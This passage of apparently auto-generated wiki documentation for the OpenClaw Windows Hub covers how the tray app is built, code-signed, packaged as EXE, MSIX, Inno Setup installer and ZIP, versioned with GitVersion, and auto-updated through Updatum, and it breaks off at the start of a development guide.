</PropertyGroup>
```

**WebView2Loader.dll Handling:**

For unpackaged builds, the `WebView2Loader.dll` must be copied to the output directory root. The build system detects the target architecture (x64 or ARM64) and copies the appropriate native binary:

[src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj:51-60]()

**Build Command (CI):**

```bash
dotnet publish src/OpenClaw.Tray.WinUI -c Release -r {win-x64|win-arm64} --self-contained
```

**Sources:** [src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj:16-20](), [.github/workflows/ci.yml:75-76]()

### MSIX Packages

MSIX packages provide package identity and enable native camera/microphone consent prompts. These packages are intended for sideloading and cannot be distributed through the Microsoft Store without additional signing.

**Package Manifest Structure:**

```mermaid
graph TB
    Manifest["Package.appxmanifest"]
    Identity["Identity<br/>&lt;Name, Publisher, Version&gt;"]
    Properties["Properties<br/>&lt;DisplayName, Logo&gt;"]
    Dependencies["Dependencies<br/>&lt;Windows.Desktop 10.0.19041.0+&gt;"]
    Application["Application<br/>&lt;Executable, EntryPoint&gt;"]
    Protocol["uap:Protocol<br/>&lt;openclaw://&gt;"]
    Capabilities["Capabilities"]
    
    Manifest --> Identity
    Manifest --> Properties
    Manifest --> Dependencies
    Manifest --> Application
    Manifest --> Capabilities
    
    Application --> Protocol
    
    Capabilities --> InternetClient["internetClient"]
    Capabilities --> RunFullTrust["runFullTrust"]
    Capabilities --> Webcam["webcam"]
    Capabilities --> Microphone["microphone"]
    
    Identity -.->|"Must match"| AzureCert["Azure Trusted Signing<br/>Certificate Subject"]
```

**Sources:** [src/OpenClaw.Tray.WinUI/Package.appxmanifest:1-62]()

**Publisher Identity Requirement:**

The `Publisher` field in the MSIX manifest must exactly match the Azure Trusted Signing certificate subject:

[src/OpenClaw.Tray.WinUI/Package.appxmanifest:12-14]()

**Project Configuration:**

```xml
<PropertyGroup Condition="'$(PackageMsix)' == 'true'">
  <WindowsPackageType>MSIX</WindowsPackageType>
  <WindowsAppSDKSelfContained>true</WindowsAppSDKSelfContained>
  <AppxPackageSigningEnabled>false</AppxPackageSigningEnabled>
  <GenerateAppxPackageOnBuild>true</GenerateAppxPackageOnBuild>
  <AppxBundle>Never</AppxBundle>
  <UapAppxPackageBuildMode>SideloadOnly</UapAppxPackageBuildMode>
</PropertyGroup>
```

**Build Process:**

The CI pipeline builds MSIX packages using MSBuild with architecture-specific platform settings:

[.github/workflows/ci.yml:144-156]()

**Version Patching:**

The MSIX manifest requires a 4-part version number (e.g., `0.4.4.0`). The CI pipeline patches the manifest before building:

[.github/workflows/ci.yml:134-142]()

**Sources:** [src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj:23-32](), [.github/workflows/ci.yml:106-198]()

### Inno Setup Installers

Inno Setup produces traditional Windows installers that install both the tray application and the PowerToys Command Palette extension.

**Installer Build Process:**

```mermaid
graph LR
    TrayArtifact["Tray Artifact<br/>artifacts/tray-{arch}/*"]
    CmdPalArtifact["Command Palette Artifact<br/>artifacts/cmdpal-{arch}/*"]
    PublishFolder["publish-{arch}/<br/>├── OpenClaw.Tray.WinUI.exe<br/>├── Assets/<br/>└── cmdpal/<br/>    └── AppxManifest.xml"]
    InnoScript["installer.iss"]
    InnoSetup["Inno Setup Compiler<br/>(ISCC.exe)"]
    Installer["Output/OpenClawTray-Setup-{arch}.exe"]
    Signer["Azure Trusted Signing"]
    SignedInstaller["Signed Installer"]
    
    TrayArtifact --> PublishFolder
    CmdPalArtifact --> PublishFolder
    PublishFolder --> InnoSetup
    InnoScript --> InnoSetup
    InnoSetup --> Installer
    Installer --> Signer
    Signer --> SignedInstaller
```

**Sources:** [.github/workflows/ci.yml:296-320](), [.github/workflows/ci.yml:327-340]()

**Command Palette Extension Inclusion:**

The installer locates the Command Palette extension's `AppxManifest.xml` file and copies the entire folder structure into `publish-{arch}/cmdpal`:

[.github/workflows/ci.yml:301-305](), [.github/workflows/ci.yml:314-318]()

**Inno Setup Parameters:**

```powershell
ISCC.exe /DMyAppVersion={version} /DMyAppArch={x64|arm64} /Dpublish=publish-{arch} installer.iss
```

**Sources:** [.github/workflows/ci.yml:292-320]()

### Portable ZIP Archives

ZIP archives follow the Updatum library's naming convention to enable automatic updates. The archive name must include the architecture identifier for proper version detection.

**Naming Convention:**

```
OpenClawTray-{majorMinorPatch}-{win-x64|win-arm64}.zip
```

Example: `OpenClawTray-0.4.4-win-x64.zip`

**Creation Process:**

[.github/workflows/ci.yml:286-290]()

**Contents:**

The ZIP archive contains the same files as the standalone EXE build, including:
- `OpenClaw.Tray.WinUI.exe`
- `Assets/` directory
- All runtime dependencies

**Update Detection:**

The Updatum library parses the ZIP filename to extract the version number and architecture. The application compares this against the currently running assembly version (see [Versioning & Updates](#6.4)).

**Sources:** [.github/workflows/ci.yml:286-290](), [docs/VERSIONING.md:36-44]()

## Package Configuration

### MSIX Manifest Details

The MSIX manifest (`Package.appxmanifest`) defines package identity, capabilities, and protocol handlers.

**Key Elements:**

| Element | Purpose | Value |
|---------|---------|-------|
| `Identity.Name` | Package identifier | `OpenClaw.Tray` |
| `Identity.Publisher` | Certificate subject | `CN=Scott Hanselman, O=Scott Hanselman, ...` |
| `Identity.Version` | 4-part version | `{major}.{minor}.{patch}.0` |
| `uap:Protocol.Name` | Deep link scheme | `openclaw` |
| `DeviceCapability[webcam]` | Camera access | Triggers consent prompt |
| `DeviceCapability[microphone]` | Microphone access | Triggers consent prompt |

**Protocol Handler:**

For MSIX-packaged applications, the `openclaw://` protocol is registered declaratively in the manifest rather than via registry:

[src/OpenClaw.Tray.WinUI/Package.appxmanifest:46-51]()

The `DeepLinkHandler` detects packaged mode and skips registry registration:

[src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs:18-22]()

**Sources:** [src/OpenClaw.Tray.WinUI/Package.appxmanifest:1-62](), [src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs:15-44]()

### Project Build Properties

The `OpenClaw.Tray.WinUI.csproj` file uses conditional properties to switch between packaged (MSIX) and unpackaged (EXE) builds:

**Conditional Compilation:**

```mermaid
graph TB
    BuildCondition{{"PackageMsix == 'true'?"}}
    UnpackagedProps["Unpackaged Properties:<br/>WindowsPackageType=None<br/>ApplicationManifest=app.manifest<br/>WebView2Loader copy target"]
    PackagedProps["Packaged Properties:<br/>WindowsPackageType=MSIX<br/>GenerateAppxPackageOnBuild=true<br/>AppxPackageSigningEnabled=false<br/>UapAppxPackageBuildMode=SideloadOnly"]
    
    BuildCondition -->|No| UnpackagedProps
    BuildCondition -->|Yes| PackagedProps
    
    UnpackagedProps --> StandaloneEXE["Standalone EXE Output"]
    PackagedProps --> MSIXOutput["MSIX Package Output"]
```

**Sources:** [src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj:16-32]()

**Dependencies:**

Both build modes use:
- `Microsoft.WindowsAppSDK` (version 1.8.260101001)
- `Updatum` (version 1.3.4) for auto-update
- `WinUIEx` (version 2.9.0) for window management
- `Microsoft.Toolkit.Uwp.Notifications` (version 7.1.3) for toast notifications

[src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj:38-44]()

**Sources:** [src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj:1-62]()

## Distribution Process

### Release Creation Flow

```mermaid
sequenceDiagram
    participant CI as "CI/CD Pipeline"
    participant Build as "Build Jobs"
    participant Sign as "Azure Trusted Signing"
    participant Release as "GitHub Release"
    participant User as "End User"
    
    Note over CI,Build: Tag pushed (v*)
    
    CI->>Build: build (win-x64, win-arm64)
    Build->>Build: Publish standalone EXE
    Build->>Sign: Sign EXE
    Sign-->>Build: Signed EXE
    Build->>CI: Upload artifacts
    
    CI->>Build: build-msix (x64, ARM64)
    Build->>Build: Build MSIX package
    Build->>Build: Patch manifest version
    Build->>Sign: Sign MSIX
    Sign-->>Build: Signed MSIX
    Build->>CI: Upload MSIX artifacts
    
    CI->>Build: build-extension (x64, arm64)
    Build->>Build: Build Command Palette DLL
    Build->>CI: Upload extension artifacts
    
    CI->>CI: release job
    CI->>CI: Create ZIP archives
    CI->>CI: Build Inno installers
    CI->>Sign: Sign installers
    Sign-->>CI: Signed installers
    
    CI->>Release: Create release with artifacts
    Release-->>User: Download installer/ZIP/MSIX
    
    User->>User: Updatum checks for updates
    User->>Release: Download new ZIP
```

**Sources:** [.github/workflows/ci.yml:227-382]()

### GitHub Release Assets

Each release publishes six artifacts:

[.github/workflows/ci.yml:346-352]()

**Release Notes Template:**

The CI pipeline generates release notes with download instructions for each architecture:

[.github/workflows/ci.yml:353-382]()

**Sources:** [.github/workflows/ci.yml:342-382]()

### Code Signing

All distributable artifacts (EXE, MSIX, installers) are signed using Azure Trusted Signing with the `WindowsEdgeLight` certificate profile.

**Signing Configuration:**

| Parameter | Value |
|-----------|-------|
| Endpoint | `https://wus2.codesigning.azure.net/` |
| Signing Account | `hanselman` |
| Certificate Profile | `WindowsEdgeLight` |
| File Digest | SHA256 |
| Timestamp Server | `http://timestamp.acs.microsoft.com` |

**Executable Signing:**

[.github/workflows/ci.yml:84-98]()

**MSIX Signing:**

[.github/workflows/ci.yml:177-192]()

**Installer Signing:**

[.github/workflows/ci.yml:327-340]()

**Sources:** [.github/workflows/ci.yml:78-98](), [.github/workflows/ci.yml:172-192](), [.github/workflows/ci.yml:322-340]()

## Architecture Support

### Multi-Architecture Build Matrix

The build system produces packages for two Windows architectures:

| Architecture | Runtime Identifier | Platform Flag | Target Devices |
|--------------|-------------------|---------------|----------------|
| x64 | `win-x64` | `x64` | Intel/AMD 64-bit |
| ARM64 | `win-arm64` | `ARM64` | Windows on ARM (Surface, etc.) |

**Build Matrix Configuration:**

[.github/workflows/ci.yml:57-59](), [.github/workflows/ci.yml:112-118]()

**Runtime Identifier Usage:**

- Standalone EXE builds: `-r {win-x64|win-arm64}`
- MSIX builds: `-r {win-x64|win-arm64}` + `/p:Platform={x64|ARM64}`

[.github/workflows/ci.yml:73](), [.github/workflows/ci.yml:148-149]()

**Sources:** [.github/workflows/ci.yml:54-118]()

### Architecture-Specific Considerations

**WebView2Loader.dll:**

The unpackaged build must copy the correct architecture-specific `WebView2Loader.dll` from the `runtimes/{win-x64|win-arm64}/native/` directory:

[src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj:51-60]()

**Command Palette Extension:**

The PowerToys Command Palette extension is built separately for each architecture using the `Platform` property:

[.github/workflows/ci.yml:218-219]()

**Sources:** [src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj:51-60](), [.github/workflows/ci.yml:200-225]()

## Package Comparison

### Feature Matrix

| Feature | Standalone EXE | MSIX | Inno Installer | Portable ZIP |
|---------|---------------|------|----------------|--------------|
| Installation Required | No | Yes (sideload) | Yes | No |
| Camera/Mic Consent | ✗ | ✓ | ✗ | ✗ |
| Auto-Update | ✗ | ✗ | ✓ | ✓ |
| Command Palette Included | ✗ | ✗ | ✓ | ✗ |
| Registry Integration | Manual | Automatic | Automatic | Manual |
| Uninstall Support | Manual | Automatic | Automatic | Manual |
| Code Signed | ✓ | ✓ | ✓ | ✗ |

**Distribution Recommendations:**

- **MSIX**: Recommended for users who need camera/microphone capabilities in Node Mode
- **Inno Installer**: Recommended for first-time users who want traditional installation with Command Palette extension
- **Portable ZIP**: Used by Updatum for automatic updates after initial installation
- **Standalone EXE**: Used for development and testing

**Sources:** [.github/workflows/ci.yml:353-370]()

---

# Page: Versioning & Updates

# Versioning & Updates

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [.github/workflows/ci.yml](.github/workflows/ci.yml)
- [docs/VERSIONING.md](docs/VERSIONING.md)
- [src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj](src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj)
- [src/OpenClaw.Tray.WinUI/Package.appxmanifest](src/OpenClaw.Tray.WinUI/Package.appxmanifest)
- [src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs](src/OpenClaw.Tray.WinUI/Services/DeepLinkHandler.cs)
- [src/OpenClaw.Tray/OpenClaw.Tray.csproj](src/OpenClaw.Tray/OpenClaw.Tray.csproj)

</details>



This page documents the versioning strategy and automatic update system used by the OpenClaw Windows Hub. It covers GitVersion-based semantic versioning, version property management, the CI/CD version flow, and the Updatum auto-update mechanism.

For information about the CI/CD pipeline that produces versioned artifacts, see [CI/CD Pipeline](#6.2). For details about packaging formats, see [Packaging & Distribution](#6.3).

---

## GitVersion-Based Versioning

The project uses **GitVersion** to automatically derive semantic version numbers from Git commit history and tags. This ensures consistent versioning across all build artifacts without manual version file updates.

### Git Tag Format

Version numbers are controlled by Git tags following the pattern `v{major}.{minor}.{patch}`:

```
v0.4.4
v0.5.0
v1.0.0-beta.1
```

GitVersion analyzes the commit history since the most recent tag to determine the appropriate semantic version for each build.

**Diagram: Version Source Flow**

```mermaid
graph LR
    GitTag["Git Tag<br/>(e.g., v0.4.4)"]
    GitVersion["GitVersion Tool<br/>Semantic analysis"]
    SemVer["semVer Output<br/>(0.4.5-alpha.1)"]
    MajorMinorPatch["majorMinorPatch Output<br/>(0.4.5)"]
    
    GitTag --> GitVersion
    GitVersion --> SemVer
    GitVersion --> MajorMinorPatch
    
    SemVer --> BuildProcess["dotnet build<br/>-p:Version=0.4.5-alpha.1"]
    MajorMinorPatch --> MSIXManifest["Package.appxmanifest<br/>Version=0.4.5.0"]
    MajorMinorPatch --> ArtifactNaming["OpenClawTray-0.4.5-win-x64.zip"]
```

Sources: [.github/workflows/ci.yml:23-30](), [.github/workflows/ci.yml:50-52]()

### GitVersion Configuration

GitVersion is installed and executed in the CI pipeline's test job:

| Step | Action | Output |
|------|--------|--------|
| Install | `gittools/actions/gitversion/setup@v4` with version `6.4.x` | GitVersion CLI available |
| Execute | `gittools/actions/gitversion/execute@v4` | Outputs: `semVer`, `majorMinorPatch`, etc. |
| Use | Passed to subsequent jobs via `outputs` | Available as `needs.test.outputs.semVer` |

Sources: [.github/workflows/ci.yml:23-30](), [.github/workflows/ci.yml:50-52]()

---

## Version Properties

.NET projects have multiple version-related properties that serve different purposes. The OpenClaw projects use a **single-source approach** where only `Version` is explicitly set.

### Property Roles

| Property | Purpose | How It's Set |
|----------|---------|--------------|
| `Version` | Primary version identifier | Explicitly in `.csproj` (fallback) or via CLI `-p:Version=...` |
| `AssemblyVersion` | .NET assembly identity | Auto-derived from `Version` (numeric part only) |
| `FileVersion` | Windows file metadata | Auto-derived from `Version` (numeric part only) |
| `InformationalVersion` | Full version with metadata | Auto-derived from `Version` (includes suffixes) |

### Auto-Derivation Behavior

When only `<Version>` is set in the project file, .NET automatically derives the other properties:

```xml
<!-- In OpenClaw.Tray.WinUI.csproj -->
<Version>0.4.4</Version>
<!-- FileVersion and AssemblyVersion auto-derive to 0.4.4.0 -->
```

**If `Version` is `0.4.5-beta.1`:**
- `AssemblyVersion` → `0.4.5.0`
- `FileVersion` → `0.4.5.0`
- `InformationalVersion` → `0.4.5-beta.1`

This ensures consistency: there is **no separate maintenance** of `FileVersion` or `AssemblyVersion`.

Sources: [src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj:12](), [docs/VERSIONING.md:18-24]()

### Critical for Updatum

The `AssemblyVersion` property is critical because the Updatum auto-updater reads it from the running executable:

```csharp
// Updatum internally calls:
Assembly.GetExecutingAssembly().GetName().Version
```

If `AssemblyVersion` doesn't match the actual semantic version, the updater will repeatedly offer updates even when already on the latest version.

Sources: [docs/VERSIONING.md:38-44]()

### MSIX Version Requirements

MSIX packages require a **4-part version number** (`X.Y.Z.W`) in the `Package.appxmanifest`. The CI pipeline patches this before building:

**Diagram: MSIX Version Patching**

```mermaid
sequenceDiagram
    participant CI as "CI Pipeline"
    participant GV as "GitVersion"
    participant XML as "Package.appxmanifest"
    participant MSBuild as "MSBuild"
    
    CI->>GV: "Execute GitVersion"
    GV-->>CI: "majorMinorPatch = 0.4.5"
    CI->>CI: "Append .0 → version = 0.4.5.0"
    CI->>XML: "Set Identity.Version = 0.4.5.0"
    Note over XML: "<Identity Version='0.4.5.0' />"
    CI->>MSBuild: "Build MSIX with /p:Version=0.4.5"
```

Sources: [.github/workflows/ci.yml:134-142](), [src/OpenClaw.Tray.WinUI/Package.appxmanifest:15]()

The patching script:

```powershell
$version = "${{ needs.test.outputs.majorMinorPatch }}.0"
$manifest = "src/OpenClaw.Tray.WinUI/Package.appxmanifest"
[xml]$xml = Get-Content $manifest
$xml.Package.Identity.Version = $version
$xml.Save((Resolve-Path $manifest))
```

Sources: [.github/workflows/ci.yml:136-141]()

---

## CI/CD Version Flow

### Build Process

The CI pipeline passes the GitVersion-derived version to all build commands:

**For Standard Builds:**
```bash
dotnet build src/OpenClaw.Tray.WinUI \
  --no-restore \
  -c Release \
  -r win-x64 \
  -p:Version=0.4.5-beta.1
```

**For Publish:**
```bash
dotnet publish src/OpenClaw.Tray.WinUI \
  -c Release \
  -r win-x64 \
  --self-contained \
  -p:Version=0.4.5-beta.1 \
  -o publish
```

The `-p:Version=...` argument overrides the `<Version>` property in the `.csproj`, which in turn automatically sets `AssemblyVersion` and `FileVersion` to match.

Sources: [.github/workflows/ci.yml:73](), [.github/workflows/ci.yml:76]()

### Version Flow Diagram

```mermaid
graph TB
    subgraph "Source Control"
        Tag["Git Tag v0.4.5"]
        Commits["Commit History"]
    end
    
    subgraph "CI Pipeline (test job)"
        GitVersionTool["GitVersion Tool<br/>gittools/actions"]
        SemVerOutput["Output: semVer = 0.4.5-alpha.1"]
        PatchOutput["Output: majorMinorPatch = 0.4.5"]
    end
    
    subgraph "CI Pipeline (build job)"
        DotnetBuild["dotnet build<br/>-p:Version=0.4.5-alpha.1"]
        AssemblyMeta["Assembly Metadata<br/>AssemblyVersion: 0.4.5.0<br/>FileVersion: 0.4.5.0<br/>InfoVersion: 0.4.5-alpha.1"]
    end
    
    subgraph "CI Pipeline (build-msix job)"
        MSIXPatch["Patch Package.appxmanifest<br/>Version=0.4.5.0"]
        MSBuildMSIX["msbuild (MSIX)<br/>-p:Version=0.4.5"]
    end
    
    subgraph "CI Pipeline (release job)"
        ZipNaming["OpenClawTray-0.4.5-win-x64.zip"]
        InstallerNaming["OpenClawTray-Setup-x64.exe"]
        MSIXNaming["OpenClawTray-0.4.5-win-x64.msix"]
    end
    
    Tag --> GitVersionTool
    Commits --> GitVersionTool
    GitVersionTool --> SemVerOutput
    GitVersionTool --> PatchOutput
    
    SemVerOutput --> DotnetBuild
    DotnetBuild --> AssemblyMeta
    
    PatchOutput --> MSIXPatch
    PatchOutput --> ZipNaming
    PatchOutput --> MSIXNaming
    MSIXPatch --> MSBuildMSIX
    
    AssemblyMeta --> ZipNaming
    AssemblyMeta --> InstallerNaming
    MSBuildMSIX --> MSIXNaming
```

Sources: [.github/workflows/ci.yml:28-52](), [.github/workflows/ci.yml:72-76](), [.github/workflows/ci.yml:134-156]()

---

## Updatum Auto-Update System

The OpenClaw Windows Hub uses the **Updatum** library to provide automatic update checking and installation from GitHub Releases.

### Library Integration

Both tray applications include the Updatum NuGet package:

```xml
<PackageReference Include="Updatum" Version="1.3.4" />
```

Sources: [src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj:43](), [src/OpenClaw.Tray/OpenClaw.Tray.csproj:31]()

### Update Checking Flow

**Diagram: Updatum Update Check**

```mermaid
sequenceDiagram
    participant App as "Running App"
    participant Updatum as "Updatum Library"
    participant Assembly as "Assembly Metadata"
    participant GitHub as "GitHub Releases API"
    participant User as "User"
    
    App->>Updatum: "Check for updates"
    Updatum->>Assembly: "GetExecutingAssembly().GetName().Version"
    Assembly-->>Updatum: "Current version: 0.4.4.0"
    
    Updatum->>GitHub: "GET /repos/openclaw/openclaw-windows-node/releases"
    GitHub-->>Updatum: "Latest: v0.4.5"
    
    Updatum->>Updatum: "Parse asset filenames<br/>OpenClawTray-0.4.5-{arch}.zip"
    Updatum->>Updatum: "Compare 0.4.4 < 0.4.5"
    Updatum-->>App: "Update available: 0.4.5"
    
    App->>User: "Show update notification<br/>(optional auto-install)"
    User->>App: "User accepts"
    App->>Updatum: "Download and install update"
    Updatum->>GitHub: "Download ZIP asset"
    Updatum->>Updatum: "Extract and replace EXE<br/>Relaunch application"
```

Sources: [.github/workflows/ci.yml:286-290](), [docs/VERSIONING.md:38-44]()

### Artifact Naming Convention

Updatum requires a **specific naming pattern** for auto-update ZIP files:

**Required Pattern:**
```
{AppName}-{Version}-{RuntimeIdentifier}.zip
```

**Examples:**
```
OpenClawTray-0.4.5-win-x64.zip
OpenClawTray-0.4.5-win-arm64.zip
```

The CI pipeline creates these ZIP files in the release job:

```powershell
Compress-Archive `
  -Path artifacts/tray-win-x64/* `
  -DestinationPath OpenClawTray-${{ needs.test.outputs.majorMinorPatch }}-win-x64.zip

Compress-Archive `
  -Path artifacts/tray-win-arm64/* `
  -DestinationPath OpenClawTray-${{ needs.test.outputs.majorMinorPatch }}-win-arm64.zip
```

Sources: [.github/workflows/ci.yml:288-290]()

### Architecture Detection

Updatum automatically detects the running application's architecture (`win-x64` or `win-arm64`) and downloads the appropriate ZIP file from the GitHub release.

| Application Architecture | ZIP File Downloaded |
|-------------------------|---------------------|
| x64 (Intel/AMD) | `OpenClawTray-{version}-win-x64.zip` |
| ARM64 (Surface, etc.) | `OpenClawTray-{version}-win-arm64.zip` |

---

## Release Distribution

### GitHub Releases as Update Source

All versioned artifacts are published to **GitHub Releases** when a tag matching `v*` is pushed:

**Trigger:**
```yaml
on:
  push:
    tags: [ 'v*' ]
```

Sources: [.github/workflows/ci.yml:4-6]()

### Release Artifacts

Each release includes multiple artifact types:

| Artifact Type | Naming Pattern | Purpose |
|--------------|----------------|---------|
| Installer (x64) | `OpenClawTray-Setup-x64.exe` | Inno Setup installer for x64 |
| Installer (ARM64) | `OpenClawTray-Setup-arm64.exe` | Inno Setup installer for ARM64 |
| Portable ZIP (x64) | `OpenClawTray-{version}-win-x64.zip` | Auto-update target for x64 |
| Portable ZIP (ARM64) | `OpenClawTray-{version}-win-arm64.zip` | Auto-update target for ARM64 |
| MSIX Package (x64) | `OpenClawTray-{version}-win-x64.msix` | Packaged app with camera/mic consent |
| MSIX Package (ARM64) | `OpenClawTray-{version}-win-arm64.msix` | Packaged app with camera/mic consent |

Sources: [.github/workflows/ci.yml:346-352]()

### Release Creation

The release job uses `softprops/action-gh-release@v2` to create a GitHub release with:

- Auto-generated release notes
- All six artifact files attached
- Markdown body with download links and feature highlights

**Release Body Template:**
```markdown
## OpenClaw Windows Hub v0.4.5

### Downloads
- **Installer (x64)**: `OpenClawTray-Setup-x64.exe` - Intel/AMD 64-bit
- **Installer (ARM64)**: `OpenClawTray-Setup-arm64.exe` - Windows on ARM
- **Portable x64**: `OpenClawTray-0.4.5-win-x64.zip`
- **Portable ARM64**: `OpenClawTray-0.4.5-win-arm64.zip`
- **MSIX x64**: `OpenClawTray-0.4.5-win-x64.msix` - Packaged (camera/mic consent)
- **MSIX ARM64**: `OpenClawTray-0.4.5-win-arm64.msix` - Packaged (camera/mic consent)
```

Sources: [.github/workflows/ci.yml:353-363]()

---

## Version Consistency Best Practices

### Do Not Hardcode Version Properties

The `.csproj` files should **only** set `<Version>`:

```xml
<!-- CORRECT -->
<Version>0.4.4</Version>

<!-- INCORRECT - Do not set these -->
<FileVersion>0.4.4</FileVersion>
<AssemblyVersion>0.4.4</AssemblyVersion>
```

Hardcoding `FileVersion` and `AssemblyVersion` prevents them from being overridden by the CI pipeline's `-p:Version=...` argument, leading to version mismatches.

Sources: [docs/VERSIONING.md:68-71]()

### Verify Assembly Metadata

After building, verify that the produced executable has correct version metadata:

**Windows File Properties:**
1. Right-click EXE → Properties → Details
2. Verify **File version** matches expected semantic version
3. Verify **Product version** matches expected semantic version

**PowerShell Verification:**
```powershell
(Get-Item OpenClaw.Tray.WinUI.exe).VersionInfo | Select-Object FileVersion, ProductVersion
```

Sources: [docs/VERSIONING.md:73]()

### Test Auto-Update

To verify the auto-update system works correctly:

1. Tag and push a new version: `git tag v0.4.6 && git push origin v0.4.6`
2. Wait for CI to complete and create the GitHub release
3. Install the previous version (e.g., v0.4.5)
4. Launch the application and wait for update check
5. Verify update notification appears offering v0.4.6
6. Accept update and verify successful installation

---

## Version-Related Files

| File | Role |
|------|------|
| [src/OpenClaw.Tray.WinUI/OpenClaw.Tray.WinUI.csproj:12]() | `<Version>` property (fallback) |
| [src/OpenClaw.Tray/OpenClaw.Tray.csproj:17]() | `<Version>` property (WinForms) |
| [src/OpenClaw.Tray.WinUI/Package.appxmanifest:15]() | MSIX Identity version (patched by CI) |
| [.github/workflows/ci.yml:23-52]() | GitVersion setup and execution |
| [.github/workflows/ci.yml:73,76]() | Version passing to build commands |
| [.github/workflows/ci.yml:134-142]() | MSIX manifest version patching |
| [.github/workflows/ci.yml:286-290]() | ZIP artifact creation for Updatum |
| [docs/VERSIONING.md]() | Detailed versioning documentation |

---

# Page: Development Guide

# Development Guide

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [README.md](README.md)
- [build.ps1](build.ps1)
- [src/OpenClaw.Shared/OpenClaw.Shared.csproj](src/OpenClaw.Shared/OpenClaw.Shared.csproj)
- [src/OpenClaw.Tray.WinUI/Dialogs/WelcomeDialog.cs](src/OpenClaw.Tray.WinUI/Dialogs/WelcomeDialog.cs)
- [src/OpenClaw.Tray/DEVELOPMENT.md](src/OpenClaw.Tray/DEVELOPMENT.md)
- [src/OpenClaw.Tray/README.md](src/OpenClaw.Tray/README.md)

</details>



This guide provides technical guidance for developers working on the OpenClaw Windows Hub codebase. It covers environment setup, build procedures, project structure, and common development workflows.

For step-by-step instructions on setting up a development environment from scratch, see [Getting Started](#7.1). For information on running tests, see [Testing](#7.2). For details on developing the PowerToys extension specifically, see [PowerToys Command Palette Extension](#7.3).

For information about the build and distribution pipeline (CI/CD, packaging, versioning), see [Build & Distribution](#6).

---

## Prerequisites and Tools

Development requires the following tools and SDKs:

| Tool | Version | Purpose | Required For |
|------|---------|---------|--------------|
| .NET SDK | 10.0+ | All projects | All |
| Windows 10 SDK | 19041+ | WinUI compilation | `OpenClaw.Tray.WinUI`, `OpenClaw.CommandPalette` |
| WebView2 Runtime | Latest | Embedded browser | Runtime testing (pre-installed on modern Windows) |
| Visual Studio 2022 | 17.12+ | IDE (optional) | WinUI development, MSIX debugging |
| PowerShell | 5.1+ or 7+ | Build scripts | Running `build.ps1` |
| Git | 2.0+ | Version control | Source management |

The build system automatically detects system architecture (x64 or ARM64) and selects the appropriate runtime identifier. Cross-compilation from Linux is supported via the `EnableWindowsTargeting` property for CI/CD scenarios.

**Sources:** [README.md:23-28](), [build.ps1:60-129]()

---

## Monorepo Structure

The repository contains four distinct projects that share common infrastructure:

```mermaid
graph TB
    subgraph "Source Projects"
        Shared["OpenClaw.Shared<br/>(Class Library)<br/>net10.0"]
        TrayWinForms["OpenClaw.Tray<br/>(Windows Forms)<br/>net10.0-windows"]
        TrayWinUI["OpenClaw.Tray.WinUI<br/>(WinUI 3)<br/>net10.0-windows10.0.19041.0"]
        CommandPalette["OpenClaw.CommandPalette<br/>(WinUI 3 MSIX)<br/>net10.0-windows10.0.19041.0"]
    end
    
    subgraph "Key Namespaces in Shared"
        GatewayClient["OpenClaw.Shared<br/>OpenClawGatewayClient"]
        NodeClient["OpenClaw.Shared.Node<br/>WindowsNodeClient"]
        Models["OpenClaw.Shared.Models<br/>SessionInfo, ChannelHealth, etc."]
        Capabilities["OpenClaw.Shared.Capabilities<br/>INodeCapability, SystemCapability, etc."]
    end
    
    subgraph "Key Classes in Tray.WinUI"
        TrayApp["TrayApplication<br/>(Main orchestrator)"]
        SettingsMgr["SettingsManager<br/>(JSON persistence)"]
        Flyouts["FlyoutManager<br/>(Menu construction)"]
        NodeMgr["NodeManager<br/>(Node mode coordinator)"]
    end
    
    TrayWinForms --> Shared
    TrayWinUI --> Shared
    CommandPalette --> Shared
    
    Shared --> GatewayClient
    Shared --> NodeClient
    Shared --> Models
    Shared --> Capabilities
    
    TrayWinUI --> TrayApp
    TrayWinUI --> SettingsMgr
    TrayWinUI --> Flyouts
    TrayWinUI --> NodeMgr
```

**Directory Layout:**
```
openclaw-windows-node/
├── src/
│   ├── OpenClaw.Shared/               # Gateway client, node client, capabilities
│   │   ├── OpenClawGatewayClient.cs  # WebSocket operator mode client
│   │   ├── Node/
│   │   │   ├── WindowsNodeClient.cs  # WebSocket node mode client
│   │   │   └── DeviceIdentity.cs     # Ed25519 device authentication
│   │   ├── Capabilities/              # Node mode command implementations
│   │   │   ├── INodeCapability.cs
│   │   │   ├── SystemCapability.cs
│   │   │   ├── CanvasCapability.cs
│   │   │   ├── ScreenCapability.cs
│   │   │   └── CameraCapability.cs
│   │   └── Models/                    # Shared data structures
│   ├── OpenClaw.Tray/                 # Legacy WinForms tray app
│   ├── OpenClaw.Tray.WinUI/          # Modern WinUI tray app (primary)
│   │   ├── TrayApplication.cs        # Main application controller
│   │   ├── SettingsManager.cs        # settings.json persistence
│   │   ├── FlyoutManager.cs          # Context menu builder
│   │   ├── NodeManager.cs            # Node mode lifecycle
│   │   ├── Windows/                   # UI windows (Settings, WebChat, etc.)
│   │   └── Dialogs/                   # Modal dialogs (Welcome, QuickSend)
│   └── OpenClaw.CommandPalette/       # PowerToys Run extension
├── tests/
│   └── OpenClaw.Shared.Tests/         # Unit tests for shared library
├── build.ps1                          # Main build script
├── .github/
│   └── workflows/
│       └── build.yml                  # CI/CD pipeline
└── README.md
```

**Sources:** [README.md:11-19](), [README.md:279-292]()

---

## Build System Architecture

The build system uses a PowerShell script (`build.ps1`) that wraps `dotnet build` with prerequisite checking and architecture detection:

```mermaid
